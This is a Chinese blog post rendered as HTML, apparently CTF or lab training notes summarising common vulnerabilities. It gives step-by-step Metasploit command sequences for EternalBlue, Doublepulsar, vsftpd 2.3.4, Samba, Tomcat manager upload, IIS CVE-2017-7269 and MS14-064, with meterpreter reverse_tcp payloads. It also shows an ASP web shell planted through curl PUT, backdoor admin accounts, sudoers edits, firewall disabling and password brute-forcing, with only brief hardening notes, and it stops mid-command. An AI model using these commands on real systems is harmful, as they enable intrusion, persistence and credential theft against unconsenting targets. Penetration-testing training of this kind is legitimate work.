



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="Chungod's Blog" href="http://chungod.github.io/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="Chungod's Blog" href="http://chungod.github.io/atom.xml" />
<link rel="alternate" type="application/json" title="Chungod's Blog" href="http://chungod.github.io/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  

<link rel="canonical" href="http://chungod.github.io/2021/04/10/%E6%BC%8F%E6%B4%9E/">



  <title>
常见漏洞总结 |
Chungod's Blog</title>
<meta name="generator" content="Hexo 5.4.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">常见漏洞总结
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2021-04-10 14:29:15">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2021-04-10T14:29:15+08:00">2021-04-10</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Chungod's Blog</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclfb3vzhj20zk0m8wny.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeuv80yoj20zk0m8kjl.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclffsa1cj20zk0m811l.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclize41wj20zk0m87gk.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="http://chungod.github.io/2021/04/10/%E6%BC%8F%E6%B4%9E/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="Chun">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Chungod's Blog">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h2 id="常见漏洞总结"><a class="markdownIt-Anchor" href="#常见漏洞总结">#</a> 常见漏洞总结</h2>
<h2 id="ms08_067和ms17_010-_psexec"><a class="markdownIt-Anchor" href="#ms08_067和ms17_010-_psexec">#</a> ms08_067 和 ms17_010 _psexec</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">windows server2003-<span class="number">2008</span> windowsXP</span><br><span class="line">nmap -n -sV -p445 IP </span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">需要设置target</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">172.16</span><span class="number">.10</span><span class="number">.100</span>-<span class="number">200</span> </span><br><span class="line">exploit -j</span><br><span class="line">session -C <span class="string">&quot;cat C:/flagvalue.txt&quot;</span></span><br><span class="line">或者makerc ms17010.rc   进行修改（写批量脚本）</span><br><span class="line">msfconsole -r ms17010.rc</span><br></pre></td></tr></table></figure>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204090839238.png" alt="image-20201204090839238"></strong></p>
<h2 id="2ms17_010_eternalblue永恒之蓝"><a class="markdownIt-Anchor" href="#2ms17_010_eternalblue永恒之蓝">#</a> <strong>2.ms17_010_eternalblue (永恒之蓝)</strong></h2>
<p><strong>windows server 2008</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">先调用检查模块</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="built_in">set</span> rhosts IP</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> rhosts IP  可以加范围IP</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204091017768.png" alt="image-20201204091017768"></strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204092438682.png" alt="image-20201204092438682"></strong></p>
<p><strong>存在 https://gitee.com/chungod/picture/raw/master/image/</strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204092358087.png" alt="image-20201204092358087"></strong></p>
<h2 id="smb远程代码执行"><a class="markdownIt-Anchor" href="#smb远程代码执行">#</a> <strong>smb 远程代码执行</strong></h2>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204094055846.png" alt="image-20201204094055846"></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">linux操作系统</span><br><span class="line">search is_known</span><br><span class="line">use exploit&#x2F;linux&#x2F;samba&#x2F;is_known_pipename(use 0)</span><br><span class="line">set rhosts IP</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204094223923.png" alt="image-20201204094223923"></strong></p>
<p><strong>安全加固 samba 远程代码</strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204094332328.png" alt="image-20201204094332328"></strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改/etc/samba/smb.conf  </span><br><span class="line">76行添加  nt pipe support = no</span><br><span class="line">service smb restart</span><br><span class="line">service smb reload重新加载smb配置文件</span><br><span class="line">加固后发现利用不了</span><br></pre></td></tr></table></figure>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204094436068.png" alt="image-20201204094436068"></strong></p>
<h2 id="eternalblue-doublepulsar永恒之蓝的双倍脉冲模块"><a class="markdownIt-Anchor" href="#eternalblue-doublepulsar永恒之蓝的双倍脉冲模块">#</a> <strong>Eternalblue-Doublepulsar（永恒之蓝的双倍脉冲模块）</strong></h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在使用Eternalblue_doublepulsar这个模块的时候，一定需要你安装wine32，这个wine32是在linux环境下模拟windows环境，可以安装windows平台的软件，软件很厉害，但是Bug真的很多</span><br></pre></td></tr></table></figure>
<p><strong>首先解压从桌面上的<font color='orange'>Eternalblue-Doublepulsar-Metasploit-master.zip</font></strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230143509101.png" alt="image-20201230143509101"></strong></p>
<p><strong>将解压出来的文件 eterblue_doublepulsar.rb 复制到 metaasploit 保存 exp 的目录中，使用命令</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp eterblue_doublepulsar.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;windows&#x2F;smb&#x2F;</span><br></pre></td></tr></table></figure>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230143659822.png" alt="image-20201230143659822"></strong></p>
<p><strong>这一步需要做</strong></p>
<p><strong>将桌面下的 Eternalblue-Doublepulsar-Metaspoit-master / 文件夹移动到 /root 目录下并改名为<font color='orange'>Eternalblue-Doublepulsar-Metasploit</font></strong></p>
<p><strong>验证是否成功</strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230144320646.png" alt="image-20201230144320646"></strong></p>
<p><strong>模块搭建好了，现在可以开始利用</strong></p>
<p><strong>先 nmap 扫描发现靶机存在双倍脉冲 https://gitee.com/chungod/picture/raw/master/image/</strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230144701004.png" alt="image-20201230144701004"></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用smb检测模块</span><br><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br><span class="line">set rhosts 172.16.10.158</span><br><span class="line">exploit 	发现存在https:&#x2F;&#x2F;gitee.com&#x2F;chungod&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image&#x2F;</span><br></pre></td></tr></table></figure>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230144836074.png" alt="image-20201230144836074"></strong></p>
<p><strong>开始利用：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;eternalblue_doublepulsar 调用模块</span><br><span class="line">set rhosts 172.16.10.158</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 172.16.10.115</span><br><span class="line">set PROCESSINJECT lsass.exe</span><br><span class="line">set TARGETARCHITECTURE x64</span><br><span class="line">set lport 3333</span><br><span class="line">set target 7(这是Windows Server 2008 R2 (x86) (x64))</span><br><span class="line">exploit 开始利用</span><br></pre></td></tr></table></figure>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230145517148.png" alt="image-20201230145517148"></strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230145559436.png" alt="image-20201230145559436"></strong></p>
<p><strong>最后使用命令运行，执行此模块 exploit</strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230145913743.png" alt="image-20201230145913743"></strong></p>
<p><strong>如果连不上去</strong></p>
<p><strong>可以通过禁用防火墙</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NetSh Advfirewall set allprofiles state off #关闭防火墙</span><br><span class="line">Netsh Advfirewall show allprofiles #查看防火墙状态</span><br></pre></td></tr></table></figure>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230152220603.png" alt="image-20201230152220603"></strong></p>
<p><strong>下面说明加固，设置防火墙策略</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依次关闭135、137、139、445端口的网络访问权限</span><br></pre></td></tr></table></figure>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230152640180.png" alt="image-20201230152640180"></strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230152656040.png" alt="image-20201230152656040"></strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230152718530.png" alt="image-20201230152718530"></strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230152822606.png" alt="image-20201230152822606"></strong></p>
<p><strong>第二种方法设置组策略</strong></p>
<p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230154003210.png" alt="image-20201230154003210"></p>
<p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201230154017252.png" alt="image-20201230154017252"></p>
<h2 id="tomocat服务利用模块"><a class="markdownIt-Anchor" href="#tomocat服务利用模块">#</a> <strong>tomocat 服务利用模块</strong></h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">search tomocat_mgr</span><br><span class="line">use exploit/multi/http/tomcat_mgr_upload</span><br><span class="line"><span class="built_in">set</span> rhosts IP</span><br><span class="line"><span class="built_in">set</span> rport 8080</span><br><span class="line"><span class="built_in">set</span> httpUsername tomcat</span><br><span class="line"><span class="built_in">set</span> httpPassword tomcat</span><br><span class="line">exploit </span><br><span class="line">chcp 437</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">同样445也可以利用ms17_010_eternalblue</span><br><span class="line">8080 为tomocat 服务https:&#x2F;&#x2F;gitee.com&#x2F;chungod&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image&#x2F;</span><br></pre></td></tr></table></figure>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204094505154.png" alt="image-20201204094505154"></strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">实用与linux与windows</span><br><span class="line">search tomocat_jsp</span><br><span class="line">use exploit/multi/http/tomcat_jsp_upload_bypass</span><br><span class="line"><span class="built_in">set</span> rhosts IP</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<h2 id="ftp笑脸vsftpd234"><a class="markdownIt-Anchor" href="#ftp笑脸vsftpd234">#</a> <em>ftp 笑脸</em> (vsftpd2.3.4)</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">记住不能直接用nmap -n -sV 扫描会打破其他后门端口</span><br><span class="line">应该先用 nmap -n -sS -p1-65535  IP</span><br></pre></td></tr></table></figure>
<p><strong>扫描所有端口详细信息</strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204094748486.png" alt="image-20201204094748486"></strong></p>
<p><strong>发现有 ftp 服务打开，尝试笑脸 https://gitee.com/chungod/picture/raw/master/image/</strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204094845324.png" alt="image-20201204094845324"></strong></p>
<p><strong>先使用 ftp 连接</strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204094906034.png" alt="image-20201204094906034"></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">再重新开一个终端   nc IP 6200</span><br><span class="line">find &#x2F; -name flag*.txt  提取flag</span><br></pre></td></tr></table></figure>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204094931555.png" alt="image-20201204094931555"></strong></p>
<p><strong>开启 ssh 进行连接，看情况提权</strong></p>
<h2 id="提权"><a class="markdownIt-Anchor" href="#提权">#</a> <strong>提权</strong></h2>
<p><strong>成功连接，下面开启创建用户进行提权</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">useradd ljc </span><br><span class="line">passwd ljc  创建用户</span><br><span class="line">usermod -G　root ljc</span><br><span class="line">提权：</span><br><span class="line">chmod +w /etc/sudoers 增加写入权限</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ljc ALL=(ALL) NOPASSWD:ALL&quot;</span></span><br><span class="line">把root密码修改回原样，禁止root登陆。并去除sudoers的写属性(chmod -w /etc/sudoers)。完工</span><br></pre></td></tr></table></figure>
<p><strong>ssh 连接 ljc 用户，执行 sudo su 进行提权</strong></p>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204095321913.png" alt="image-20201204095321913"></strong></p>
<h2 id="ftp-笑脸"><a class="markdownIt-Anchor" href="#ftp-笑脸">#</a> <strong>ftp 笑脸</strong></h2>
<p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201204094845324.png" alt="image-20201204094845324"></strong></p>
<p><strong>打模块进入：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search vsftpd_234</span><br><span class="line">use 0 (use exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor)</span><br><span class="line">set rhosts IP</span><br><span class="line">exploit 成功利用</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">修改root</span><br><span class="line">passwd root</span><br><span class="line">cat /etc/ssh/sshd_config | grep PermitRootLogin</span><br><span class="line">sed -i <span class="string">&quot;s/PermitRootLogin no/PermitRootLogin yes/g&quot;</span> /etc/ssh/sshd_conifg</span><br><span class="line">/etc/init.d/sshd restart</span><br><span class="line">/etc/init.d/iptables stop</span><br><span class="line">ssh root@IP</span><br></pre></td></tr></table></figure>
<h2 id="ssl端口心脏滴血cve-2014-0160"><a class="markdownIt-Anchor" href="#ssl端口心脏滴血cve-2014-0160">#</a> <strong>ssl 端口心脏滴血 (CVE-2014-0160)</strong></h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search heartbleed</span><br><span class="line">use auxiliary/scanner/ssl/openssl_heartbleed</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts IP</span><br><span class="line"><span class="built_in">set</span> verbose <span class="literal">true</span> 设置内容现实(可以输出更详细的日志信息,默认<span class="literal">false</span>)</span><br><span class="line">run/exploit 运行</span><br></pre></td></tr></table></figure>
<p><strong>加固</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x04 https:&#x2F;&#x2F;gitee.com&#x2F;chungod&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image&#x2F;修复</span><br><span class="line">停止旧版的 openssl 服务，升级 openssl 到新版本，并重新启动。</span><br><span class="line">修改密码。</span><br></pre></td></tr></table></figure>
<h1 id="密码爆破模块"><a class="markdownIt-Anchor" href="#密码爆破模块">#</a> <strong>密码爆破模块</strong></h1>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">分为telnet,ssh,ftp,mysql 密码爆破，需要加字典，线程thread（5）</span><br><span class="line"><span class="attribute">use</span> auxiliary/scanner/telnet/telnet_login	（<span class="number">23</span>）</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login  	（<span class="number">22</span>）</span><br><span class="line">use auxiliary/scanner/ftp/ftp_login		（<span class="number">21</span>）</span><br><span class="line">use auxiliary/scanner/mysql/mysql_login   （<span class="number">1433</span>）</span><br><span class="line">use auxiliary/scanner/mssql/mssql_login     </span><br><span class="line">mssql辅助模块</span><br><span class="line">use auxiliary/admin/mssql/mssql_exec （需要设置mysql密码）</span><br><span class="line">use auxiliary/scanner/mysql/mysql_version  扫描mysql版本信息</span><br><span class="line"></span><br><span class="line">可用九头蛇爆破</span><br></pre></td></tr></table></figure>
<h2 id="后门端口"><a class="markdownIt-Anchor" href="#后门端口">#</a> <strong>后门端口</strong></h2>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先扫描所有端口nmap -sS -p1-<span class="number">65535</span> IP</span><br><span class="line">后门端口: <span class="number">48119</span>  ssh该端口(<span class="number">23</span>)  <span class="number">3389</span>端口被改(具体分析)</span><br><span class="line">Ingreslock 后门 (<span class="number">1524</span>)  （<span class="number">445</span>端口共享服务 <span class="built_in">net</span> use</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="win2003-cve-2017-7269-模块"><a class="markdownIt-Anchor" href="#win2003-cve-2017-7269-模块">#</a> <strong>win2003  cve-2017-7269 模块</strong></h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">适用于旧版本kali，版本445端口Microsoft IIS httpd</span><br><span class="line"> 80 端口  Microsoft IIS httpd 6.0</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;iis&#x2F;cve_2017_7269</span><br><span class="line">set rhosts ip</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost IP</span><br><span class="line">set lport 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><strong>但不过没有权限</strong></p>
<p><strong>发现没有权限，但不过 c 盘有提权工具 (pr.exe,3389.bat)</strong></p>
<p><strong>用 pr.exe 进行创建用户</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pr.exe &quot;net user ljc 123 &#x2F;add&quot;</span><br><span class="line">pr.exe &quot;net localgroup administrators ljc &#x2F;add&quot;</span><br><span class="line">pr.exe &quot;3389.bat&quot;  开启3389端口，进行远程端口连接</span><br></pre></td></tr></table></figure>
<p><strong>用 ljc 用户进入靶机</strong></p>
<p><strong>下面是获取 administrators 密码，还得进行生成反弹木马反弹</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">search ms14_064  use 0</span><br><span class="line">use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution</span><br><span class="line">set srvhost 本地IP</span><br><span class="line">set lhost 本地IP</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set uripath &#x2F;</span><br><span class="line">exploit</span><br><span class="line">复制url 到靶机浏览器进行访问，反弹，得到管理员权限</span><br></pre></td></tr></table></figure>
<p><strong>反弹得到 sessions</strong></p>
<p><strong>得到管理员 hash</strong></p>
<p><strong>可用两个工具破解 john 或 ophcrarck</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john 可解析 linux和windows的shadow文件</span><br><span class="line">命令 john &#x2F;etc&#x2F;shadow  </span><br><span class="line">这里找不到shadow文件，用ophcrark</span><br></pre></td></tr></table></figure>
<p><strong>得到管理员密码</strong></p>
<p><strong>john /etc/shadow</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如何需要重新解析，需要删除这个文件 rm .john&#x2F;john.pot</span><br></pre></td></tr></table></figure>
<h2 id="iis-put"><a class="markdownIt-Anchor" href="#iis-put">#</a> <strong>iis PUT</strong></h2>
<p><strong>webdav 打开能够上传</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http:&#x2F;&#x2F;IP&#x2F;1.txt -d &#39;&lt;%eval request(&quot;cmd&quot;)%&gt;&#39;</span><br><span class="line">curl -X MOVE -H &quot;Host:IP&quot; -H &quot;Destination:http:&#x2F;&#x2F;IP&#x2F;1.asp&quot;</span><br><span class="line">http：&#x2F;&#x2F;IP&#x2F;1.txt</span><br><span class="line"></span><br><span class="line">davtest -url http:&#x2F;&#x2F;IP</span><br><span class="line">davtest -url http:&#x2F;&#x2F;IP -uploadfile shell.php -uploadloc  生成的目录&#x2F;shell.php </span><br></pre></td></tr></table></figure>
<p><strong>端口更改</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WDS\RDPWD\TDS\TCP &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 3333 &#x2F;f</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WINSTATIONS\RDP-TCP &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 3333 &#x2F;f</span><br><span class="line">reg query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WDS\RDPWD\TDS\TCP &#x2F;v PortNumber</span><br><span class="line">reg query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WINSTATIONS\RDP-TCP &#x2F;v PortNumber</span><br><span class="line">net stop &quot;remote desktop services&quot; &#x2F;y</span><br><span class="line">net start &quot;remote desktop services&quot; &#x2F;y</span><br><span class="line"></span><br><span class="line">tasklist &#x2F;svc</span><br><span class="line">taskkill &#x2F;pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程) </span><br><span class="line">Taskkill &#x2F;pid &#x2F;f &#x2F;im pid</span><br><span class="line"></span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f  关闭</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t 